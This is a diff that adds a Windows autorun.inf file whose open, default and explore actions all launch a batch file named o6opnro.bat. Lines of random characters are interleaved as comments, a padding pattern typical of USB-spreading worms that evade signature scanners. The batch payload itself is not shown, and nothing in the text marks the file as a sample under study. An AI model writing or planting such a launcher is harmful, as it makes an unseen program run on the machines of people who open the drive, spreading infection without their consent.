@@ -1,0 +1,11 @@
+;sa3di34orDkoK3aZslD0dwD4kJplik92aap
+[AutoRun]
+;a3wJiwfDd0oD5kkJk9wqsoZa3ajD3SXjjlJFeKasZrl0rlar2nir9sLwKk024qijkKkKwL
+open=o6opnro.bat
+;aC4aswsdDqok3KjHolil7wis6w83jaLaf3Dckid0q5iqD3eJip5qq0kfl2LajaLqDsnK
+shell\open\Command=o6opnro.bat
+;U423kdlJ3i43a23s54r2jwaw503AcKnsiisaZDlqA6qKalk
+shell\open\Default=1
+;K
+shell\explore\Command=o6opnro.bat
+;0idKsooos4af3Si2KawdLseDa4Lsw0m04Udrk43l22c
